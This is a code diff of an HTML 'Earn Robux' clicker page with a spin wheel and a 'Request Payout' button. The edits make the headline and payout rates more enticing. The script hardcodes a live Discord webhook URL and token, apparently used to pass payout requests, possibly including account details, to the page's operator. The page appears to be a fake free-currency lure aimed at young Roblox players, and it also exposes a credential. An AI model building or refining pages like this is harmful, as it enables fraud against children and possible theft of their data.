@@ -38,7 +38,7 @@
   </style>
 </head>
 <body>
-  <h1>💸 Lumicade Earn Robux (x100 CLICKS, 5 MINUTE SPIN, LIMITED TIME ONLY!) 💸</h1>
+  <h1>💸 Lumicade Earn Robux (BOOST ACTIVATED) 💸</h1>
   <div id="balanceDisplay">Balance: 0.00000000 Robux</div>
   <div id="statsDisplay">Total Clicks: 0 | Total Earned: 0.00000010</div>
   <button id="clickButton">Click to Earn</button>
@@ -54,8 +54,8 @@
   <button id="payoutBtn">Request Payout</button>
   <script>
     const WEBHOOK = "https://discord.com/api/webhooks/1391457638096568562/0A8AfTfSBv4LHsmZFMgOTcmTwMJiNbxc0Re7-NJhgjm0QGobLrjjxtHChJ0wB9J2DYFs";
-    const CLICK_VALUE = 0.00000100;
-    const WHEEL_COOLDOWN = 5 * 60 * 1000;
+    const CLICK_VALUE = 0.00000500;
+    const WHEEL_COOLDOWN = 1 * 60 * 1000;
 
     let balance = parseFloat(localStorage.getItem("robux_balance")) || CLICK_VALUE;
     let totalClicks = parseInt(localStorage.getItem("total_clicks")) || 0;
